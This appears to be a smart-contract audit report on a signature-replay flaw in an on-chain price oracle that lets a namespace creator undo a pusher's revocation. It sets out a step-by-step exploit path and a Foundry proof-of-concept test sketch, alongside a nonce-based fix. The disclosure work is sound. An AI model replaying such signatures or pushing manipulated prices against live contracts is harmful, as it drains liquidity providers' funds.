Audit Report

## Title
Pusher-delegation consent signature is replayable before deadline, allowing creator to reinstate revoked oracle write authority — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

## Summary

`allowPushers` verifies a pusher's EIP-191 consent signature bound only to `(chainid, address(this), deadline, pusher, creator)` with no nonce and no action field. After a pusher self-revokes via `revokePusher()`, the creator retains the original signature bytes (publicly visible on-chain from the original `allowPushers` calldata) and can replay them at any time before the deadline to overwrite `namespaceRemapping[pusher]` back to their address, silently undoing the revocation. A compromised pusher can then inject manipulated slot words into the creator's namespace, producing bad-price bid/ask values that reach pool swap execution.

## Finding Description

`allowPushers` constructs the signed digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only replay guard is `_ensureDeadline`, which checks `block.timestamp <= deadline` — it only blocks replay *after* the deadline expires, not before: [2](#0-1) 

`revokePusher()` clears `namespaceRemapping[msg.sender]` to `address(0)` but has no mechanism to invalidate the original off-chain signature bytes:

```solidity
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

There is no per-pusher nonce, no used-signature mapping, and no on-chain record that a revocation occurred. The contract's own NatDoc comment acknowledges the partial mitigation ("an undated signature could re-establish a delegation AFTER the pusher revoked it") but only addresses the post-deadline case, not the pre-deadline replay window. [4](#0-3) 

The exploit path:
1. Pusher signs consent for Creator with `deadline = block.timestamp + 365 days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher's key is compromised; pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator replays the identical `allowPushers(deadline, [pusher], [sig])` call (deadline still in the future, `ECDSA.recover` still returns `pusher`) → `namespaceRemapping[pusher] = creator`. Revocation undone.
5. Compromised pusher calls the oracle `fallback()` with manipulated 32-byte slot words into the creator's namespace. [5](#0-4) 

## Impact Explanation

The `CompressedOracle.price()` output feeds into `PriceProvider._getBidAndAskPrice()`, which is consumed by `MetricOmmPool._getBidAndAskPriceX64()` and then passed directly to `SwapMath.midAndSpreadFeeX64FromBidAsk` to drive every swap execution. Manipulated `mid` and `spread` values from the compromised pusher produce an inverted or unbounded bid/ask pair, causing traders to receive more output than the oracle permits or the pool to receive less input than owed — satisfying the "Bad-price execution" and "Pool insolvency" impact gates with direct LP principal loss. [6](#0-5) 

## Likelihood Explanation

- The creator is an unprivileged public oracle namespace owner — not the oracle admin or factory owner.
- The original `allowPushers` calldata (including the signature bytes) is permanently visible on-chain; no off-chain secret is required.
- The creator has direct motive to replay when a pusher revokes against their wishes.
- The replay window equals the full deadline duration; nothing in the contract caps how far in the future a creator can set the deadline.
- No special privileges beyond being the original `msg.sender` of the first `allowPushers` call are required.

## Recommendation

**Short term:** Add a per-pusher nonce to the signed digest and increment it on every successful `allowPushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;
namespaceRemapping[pusher] = msg.sender;
```

A replayed old signature recovers a stale nonce and fails `ECDSA.recover` comparison.

**Long term:** Bind an explicit boolean `allow` action field into the signed payload so a consent signature cannot be repurposed as a re-delegation after revocation.

## Proof of Concept

```
// Foundry test sketch
function testReplayAfterRevoke() public {
    uint256 deadline = block.timestamp + 365 days;
    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    // Step 1: creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: pusher self-revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: creator replays identical sig — succeeds, revocation undone
    vm.prank(creator);
    oracle.allowPushers(deadline, _arr(pusher), _arr(sig));
    assertEq(oracle.namespaceRemapping(pusher), creator); // ← revocation bypassed

    // Step 4: compromised pusher pushes manipulated slot word into creator's namespace
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(manipulatedSlotWord);
    assertTrue(ok);
    // Pool now reads attacker-controlled bid/ask → bad-price swap execution
}
```
